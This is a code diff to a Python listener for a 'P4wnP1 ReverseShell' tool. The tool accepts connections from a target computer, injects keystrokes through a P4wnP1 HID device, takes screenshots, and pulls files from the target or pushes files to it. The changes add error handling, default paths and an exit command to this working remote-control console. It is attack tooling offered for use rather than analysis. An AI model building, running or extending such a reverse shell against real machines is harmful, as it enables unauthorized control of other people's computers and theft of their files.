@@ -17,6 +17,9 @@ def getpic():
     fichierImage.close()
 def dwnfile(filename):
     tailleImage = conn.recv(8)
+    #print(tailleImage)    
+    if tailleImage == '00000000' or tailleImage == '':
+        return('File %s does not exist'%(filename))
     tailleImage = int(tailleImage.decode())
     contenuTelecharge = 0
     fichierImage = open(filename,"wb")
@@ -24,7 +27,8 @@ def dwnfile(filename):
         contenuRecu = conn.recv(1024)
         fichierImage.write(contenuRecu)
         contenuTelecharge += len(contenuRecu)   
-    fichierImage.close()   
+    fichierImage.close()
+    return('ok')
 def socketCreate():
     try:
         global host
@@ -54,15 +58,15 @@ def socketAccept():
         print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
         print('**** Welcome to P4wnP1 ReverseShell by BeBoX ****')
         print('Command list :')
-        print('layout : set keyboard layout ex.layout fr')
-        print('speed : typing speed slow or fast ex.speed fast')
-        print('press : Send key stoke ex.press GUI r')
-        print('type  : type somthing on keyboard ex. type hello')
-        print('shot  : get screenshot of host computer')
+        print('layout: set P4wnP1 keyboard layout ex.layout fr')
+        print('speed : P4wnP1 typing speed slow or fast ex.speed fast')
+        print('press : Send P4wnP1 key stoke ex.press GUI r')
+        print('type  : P4wnP1 type somthing on keyboard ex. type hello')
+        print('shot  : get screenshot from host computer')
         print('dwnld : download a file from host ex.dwnld c:\Recovery.txt')
         print('upld  : upload a file to host ex.upld client.exe c:\\temp\\')
         print('-help : this text')
-        print('quit  : leave and quit reverse shell')
+        print('exit  : leave and quit reverse shell')
         hostname = conn.recv(1024)
         menu()
     except socket.error as msg:
@@ -73,25 +77,22 @@ def menu():
     result = ""
     while 1:
         cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        elif cmd == 'exit':
+        if cmd == 'exit':
+            conn.send(cmd)
             conn.close()
             s.close()
             sys.exit()
         elif cmd == '-help':
             print('Command list :')
-            print('layout : set keyboard layout ex.layout fr')
-            print('speed : typing speed slow or fast ex.speed fast')
-            print('press : Send key stoke ex.press GUI r')
-            print('type  : type somthing on keyboard ex. type hello')
-            print('shot  : get screenshot of host computer')
+            print('layout: set P4wnP1 keyboard layout ex.layout fr')
+            print('speed : P4wnP1 typing speed slow or fast ex.speed fast')
+            print('press : Send P4wnP1 key stoke ex.press GUI r')
+            print('type  : P4wnP1 type somthing on keyboard ex. type hello')
+            print('shot  : get screenshot from host computer')
             print('dwnld : download a file from host ex.dwnld c:\Recovery.txt')
             print('upld  : upload a file to host ex.upld client.exe c:\\temp\\')
             print('-help : this text')
-            print('quit  : leave and quit reverse shell')
+            print('exit  : leave and quit reverse shell')
             result = ''
         elif cmd[:6] == 'layout':
             shell("P4wnP1_cli hid run -c \"layout('%s')\""%(cmd[7:]))
@@ -109,15 +110,15 @@ def menu():
             shell("P4wnP1_cli hid run -c \"press('%s')\""%(cmd[6:]))
             result = "Send %s  to keyboard"%(cmd[6:])
         elif cmd[:5] == 'dwnld':
+            if cmd.find('\\') == -1:
+                #current folder add a path
+                cmd = cmd[:6]+'.\\'+cmd[6:]
             tmp = cmd.split("\\")
             if len(tmp) >1:
                 command = conn.send(cmd)
-                dwnfile(tmp[len(tmp)-1])
-                result = 'ok'
-            else:
-                result = "Error, need full path ex. c:\\windows\\system32\\file.sys"
+                result = dwnfile(tmp[len(tmp)-1])
         elif cmd[:4] == 'upld':
-            print('wip')
+            print('Still in developement stage')
         elif cmd[:4] == 'type':
             shell("P4wnP1_cli hid run -c \"type('%s')\""%(cmd[5:]))
             result = "Sent to keyboard"
